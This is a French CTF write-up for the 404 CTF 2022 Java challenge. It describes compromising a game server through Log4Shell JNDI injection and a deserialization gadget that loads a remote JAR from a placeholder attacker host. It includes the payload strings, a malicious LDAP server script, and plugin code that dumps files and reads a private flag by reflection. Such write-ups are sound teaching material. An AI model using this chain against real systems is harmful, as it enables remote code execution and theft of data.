---
title: Divers — JAVA
parent: 404 CTF (2022)
grand_parent: CTF writeups
---

# Joutes, Arches, Vallées & Arbalètes

```
Bonjour agent.

Le groupe Hallebarde semble avoir lancé une campagne de recrutement et
vise des scientifiques.

Nous sommes parvenus à identifier une de leur méthodes : ils ont mis au
point un jeu vidéo multijoueur en ligne de commande leur permettant de
sélectionner les meilleurs éléments. Peut-être sont-ils nostalgiques des
années 80. Nous avons identifié une adresse hébergeant une instance de ce
serveur de jeu, vous pouvez vous y connecter à l'aide des informations
ci-dessous.
Par ailleurs, les renseignements humains ont réussi à mettre la main sur
une clef USB contenant de la documentation de ce programme, nous vous la
mettons à disposition.

Pouvez-vous investiguer ce service et voir s'il est possible de le
compromettre et d'en tirer des informations sensibles ?

Auteur : Smyler#7078
nc challenge.404ctf.fr 31579 
```

Thématique: Divers

Catégorie de difficulté: Extrême

## Description

Le challenge se présente sous la forme d'un SDK en JAVA qui permet
d'implémenter un petit RPG avec des plugins.

Lorsqu'on se connecte au serveur, il annonce utiliser 3 plugins
(non fournis avec le SDK).

```
[10/06/2022 xx:33:44] [Plugin Loader] [main INFO] Exploring directory /app/plugins for plugins
[10/06/2022 xx:33:44] [Plugin Loader] [main INFO] Found plugin: npcs version 1.0.1. Main class: org.hallebarde.npcsplugin.NpcsPlugin
[10/06/2022 xx:33:44] [Plugin Loader] [main INFO] Found plugin: doorsnkeys version 1.4.2. Main class: org.hallebarde.doorsnkeys.DoorsAndKeysPlugin
[10/06/2022 xx:33:44] [Plugin Loader] [main INFO] Found plugin: singleplayer version 1.2.1. Main class: org.hallebarde.sgplugin.SinglePlayerPlugin
```

Le jeu permet de se déplacer dans des «pièces» et d'effectuer des
actions:
```
           shop (Key)
            |
spawn -- crossing -- training_room
          |   (Door)
          |        \
pit -- small_room   `- boss_room
```

Une partie simple ressemble à ceci:
```
/move crossing
/move shop
/pickup 0
/move crossing
/interact 0
/move boss_room
# You can interact with a few things in this room:
# 0	Door: An opened door.
# 1	Flag man: A strange man that seems to be carrying a flag around
/interact 1
(Server) Hi, I guess you are here for the flag, right ? (yes/no)
(Network) Sorry, I didn't quite get that, do you want the flag or not ? (yes/no)
(Network) Well... I'm sorry but it's private so I can't really give it to you... Ha, accessors...
```

## Première exécution de code à distance

Puisqu'il s'agit d'un service Java, vérifions qu'il est vulnérable à la
célèbre faille JNDI de Log4j: il semble que oui.
```
% unzip -l ./RecrutementGameSDK-0.17.2/example-plugin/gradle/game-0.31.9-all.jar
...
     2937  2021-03-06 22:12   org/apache/logging/log4j/core/lookup/JndiLookup.class
```

Et dans le jeu:
```
[10/06/2022 xx:47:06] [Internal] [main INFO] Game server started on null
${jndi:ldap://127.0.0.111:9999/object}
2022-06-10 xx:47:20,404 Network thread WARN Error looking up JNDI resource [ldap://127.0.0.111:9999/object]. javax.naming.CommunicationException: 127.0.0.111:9999 [Root exception is java.net.ConnectException: Connection refused]
	at java.naming/com.sun.jndi.ldap.Connection.<init>(Connection.java:253)
	at java.naming/com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
	at java.naming/com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1616)
	at java.naming/com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2848)
```

On peut aussi vérifier qu'il n'y a pas de pare-feu particulier, le
serveur est bien capable d'initier une connexion vers un serveur qu'on
aurait lancé nous-mêmes.

Voici quelques ressources sur les vulnérabilités en question:
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
* https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478
* https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

Les versions récentes de Java ne permettent pas forcément de télécharger
*trivialement* une classe Java depuis un serveur externe, mais une
désérialisation arbitraire permet "souvent" de déclencher du chargement
de code distant.

Examinons le code du moteur de jeu avec jadx:
```java
public class JarPluginContainer extends PluginContainer {
    private final URL url;
    private boolean loaded;

    ...
    public void load(Game game) throws CorruptedPluginException, PluginLoadingException {
        URLClassLoader loader = new URLClassLoader(new URL[]{this.url}, getClass().getClassLoader());
        load(game, loader);
        this.loaded = true;
    }
    ...
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        if (this.loaded && this.plugin == null) {
            try {
                PluginLoader.LOGGER.warn("Deserializing a plugin that does not support serialization, loading it manually!");
                PluginLoader.LOGGER.warn("Offender: " + this.metadata);
                PluginLoader.LOGGER.warn("Please implement serialization in your plugins if you wish to use plugin dumps.");
                load(RecrutementGameLauncher.getGame());
            } catch (PluginLoadingException e) {
                throw new IllegalStateException("Failed to re-load a plugin after deserialization!", e);
            }
        }
    }
    ...
}
```

On voit qu'en désérialisant un JarPluginContainer avec loaded=true, on
peut déclencher le chargement d'un JAR distant.

On prépare l'objet sérialisé:
```java
$ cat poc.java
import java.net.URL;
import java.io.ObjectOutputStream;

import org.hallebarde.recrutement.plugins.JarPluginContainer;
import org.hallebarde.recrutement.api.PluginMetadata;

public class Main {
    public static void main(String[] args) throws Exception {
        Object o = new JarPluginContainer(
                new PluginMetadata("example", "com.example.plugin.ExamplePlugin", "1.0.0"),
                new URL("http://ww.xx.yy.zz:3880/example-plugin.jar"),
                true);
        ObjectOutputStream oo = new ObjectOutputStream(System.err);
        oo.writeObject(o);
    }
}
```

```
$ java -cp game-0.31.9-all.jar poc.java 2>blob.ser
$ xxd blob.ser
00000000: aced 0005 7372 0035 6f72 672e 6861 6c6c  ....sr.5org.hall
00000010: 6562 6172 6465 2e72 6563 7275 7465 6d65  ebarde.recruteme
00000020: 6e74 2e70 6c75 6769 6e73 2e4a 6172 506c  nt.plugins.JarPl
00000030: 7567 696e 436f 6e74 6169 6e65 7251 6323  uginContainerQc#
00000040: d945 5ca1 3302 0002 5a00 066c 6f61 6465  .E\.3...Z..loade
00000050: 644c 0003 7572 6c74 000e 4c6a 6176 612f  dL..urlt..Ljava/
00000060: 6e65 742f 5552 4c3b 7872 0032 6f72 672e  net/URL;xr.2org.
...
```

Il faut ensuite le servir dans un serveur LDAP. On peut utiliser
le module Python ldapserver:
```python
import logging
import socketserver

# pip install -t . ldapserver
# https://git.cccv.de/uffd/python-ldapserver
import ldapserver

# https://docs.oracle.com/javase/jndi/tutorial/config/LDAP/java.schema
JAVA_ATTRS = """
( 1.3.6.1.4.1.42.2.27.4.1.6
  NAME 'javaClassName'
...
"""

JAVA_OBJECTS = """
( 1.3.6.1.4.1.42.2.27.4.2.4
  NAME 'javaObject'
  DESC 'Java object representation'
...
)
"""

def split(s):
    items = s.strip().split("\n\n")
    return [x.replace("\n  ", " ").replace("\n", " ") for x in items]

java_sch = ldapserver.schema.INETORG_SCHMEA.extend(
    attribute_type_definitions=split(JAVA_ATTRS),
    object_class_definitions=split(JAVA_OBJECTS),
)

obj = open("blob.ser", "rb").read()

class RequestHandler(ldapserver.LDAPRequestHandler):
    subschema = ldapserver.SubschemaSubentry(java_sch, "cn=example")

    def do_search(self, basedn, scope, filterobj):
        print(basedn, scope, filterobj)
        yield from super().do_search(basedn, scope, filterobj)
        yield self.subschema.ObjectEntry(
            "dc=example,dc=com",
            objectClass=["javaObject"],
            javaClassName=["NotImportant"],
            javaSerializedData=[obj],
        )

class Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True

Server(("0.0.0.0", 3890), RequestHandler).serve_forever()
```

Et là, gagné! On voit bien des requêtes HTTP arriver sur
`http://ww.xx.yy.zz:3880`

## Extraction des plugins

Le SDK est fourni avec un plugin exemple: on peut l'utiliser comme base
pour aller plus vite. Il faudrait savoir comment le personnage du jeu
connaît le flag (qu'il ne veut pas nous donner), et le plus simple
serait d'avoir le fichier plugin correspondant.

Commençons par trouver ces fichiers, en modifiant le plugin example:
```java
public class ExamplePlugin implements Plugin {

    private static ExamplePlugin instance;
    private Logger logger;

    @Override
    public void onLoad(Game game, PluginMetadata metadata, Logger logger) {
        instance = this;
        this.logger = logger;

        // POC
        File directory = new File("/app/plugins");
        File[] files = directory.listFiles();
        for (File file : files) {
            System.out.println("EXAMPLE File " + file.getAbsolutePath());
        }
        ...
```

On compile le plugin et on le sert en HTTP à l'URL vue plus haut.
On voit le plugin se charger mais il y a une erreur:
```
java.lang.IllegalStateException: Failed to re-load a plugin after deserialization!
Caused by: org.hallebarde.recrutement.plugins.PluginLoadingException: Encountered an exception when instantiating plugin
Caused by: java.lang.NoClassDefFoundError: org/hallebarde/recrutement/api/gameplay/activity/Activity
Caused by: java.lang.ClassNotFoundException: org.hallebarde.recrutement.api.gameplay.activity.Activity
```

On peut la contourner en s'assurant que gradle mette dans le jar les
classes nécessaires:
```
jar {
    manifest {
        attributes "Main-Class": "com.example.exampleplugin.ExamplePlugin"
    }

    from zipTree('libs/api-0.17.2.jar')
}
```

Et là miracle:
```
${jndi:ldap://ww.xx.yy.zz:3890/dc=example,dc=com}
[xx/06/2022 xx:55:24] [Internal] [Network thread INFO] [CHAT] <toto> org.hallebarde.recrutement.plugins.JarPluginContainer@3434ac63
[xx/06/2022 xx:55:33] [STDOUT] [Network thread INFO] EXAMPLE File /app/plugins/plugin-npcs-1.0.0.jar
[xx/06/2022 xx:55:33] [STDOUT] [Network thread INFO] EXAMPLE File /app/plugins/plugin-doorsnkeys-1.4.2.jar
[xx/06/2022 xx:55:33] [STDOUT] [Network thread INFO] EXAMPLE File /app/plugins/plugin-singleplayer-1.2.1.jar
```

On peut donc aller plus loin et obtenir un dump en Base64 du fichier de
plugin qui nous intéresse:
```java
    @Override
    public void onLoad(Game game, PluginMetadata metadata, Logger logger) {
        ...
        File jar = new File("/app/plugins/plugin-npcs-1.0.0.jar");
        try {
            var blob = (new FileInputStream(jar)).readAllBytes();
            String encodedMime = Base64.getMimeEncoder().encodeToString(blob);
            System.out.println(encodedMime);
        } catch (Exception e) {
            System.out.println(e.toString());
        }
        ...
    }
```

On recommence l'opération avec cette version du plugin:
```
UEsDBAoAAAgIAMy6tlQAAAAAAgAAAAAAAAAJAAAATUVUQS1JTkYvAwBQSwMECgAACAgAzLq2VLJ/
Au4bAAAAGQAAABQAAABNRVRBLUlORi9NQU5JRkVTVC5NRvNNzMtMSy0u0Q1LLSrOzM+zUjDUM+Dl
4uUCAFBLAwQKAAAICADMurZUAAAAAAIAAAAAAAAABAAAAG9yZy8DAFBLAwQKAAAICADMurZUAAAA
AAIAAAAAAAAADwAAAG9yZy9oYWxsZWJhcmRlLwMAUEsDBAoAAAgIAMy6tlQAAAAAAgAAAAAAAAAa
...
```

On obtient le fichier de 7982 octets plugin-npcs-1.0.0.jar

## Extraction du flag

On peut examiner plugin-npcs-1.0.0.jar avec JADX pour comprendre ce qui
se passe:
```java
public class FlagAI implements ConversationAI {
    private static final String FLAG;
    private boolean hasMore = true;
    private final String flag = FLAG;

    static {
        String flag = System.getProperty("ctf404.flag.cjgJF4GCxj2QD5Lg");
        if (flag == null) {
            throw new IllegalStateException("Ce challenge semble être cassé, merci de signaler cette erreur aux organisateurs.");
        }
        FLAG = flag;
        System.setProperty("ctf404.flag.cjgJF4GCxj2QD5Lg", "Sorry but the flag is no longer here.");
    }
```

Le FLAG est stocké dans un membre privé de la classe FlagAI, et de toute
façon, aucune méthode ne le renvoie. Il faut donc y accéder _de force_.
La _réflexion_ Java permet d'accéder aux champs privés.

```java
import java.lang.reflect.Field;
import org.hallebarde.npcsplugin.FlagAI;

public class ExamplePlugin implements Plugin {
    ...
    @Override
    public void onLoad(Game game, PluginMetadata metadata, Logger logger) {
        ...
        try {
            Field fld = FlagAI.class.getDeclaredField("FLAG");
            fld.setAccessible(true);
            System.out.println(fld.get(null));
        } catch (Exception e) {
            System.out.println(e.toString());
        }
        ...
```

Là encore, il faut convaincre le classloader d'accepter le plugin, donc
on met dans le JAR tous les fichiers de classe nécessaire via la
configuration Gradle:
```
    implementation files('libs/api-0.17.2.jar')
    implementation files('libs/plugin-npcs-1.0.0.jar')

    from zipTree('libs/api-0.17.2.jar').matching { include "**/*.class" }
    from zipTree('libs/plugin-npcs-1.0.0.jar').matching { include "**/*.class" }
```
et c'est bon:
```
[xx/06/2022 xx:23:07] [STDOUT] [Network thread INFO] 404CTF{j4v4_3s7_c00l_m41s_zes7_m1euX_Qu4nd_c3z7_z4f3}
```
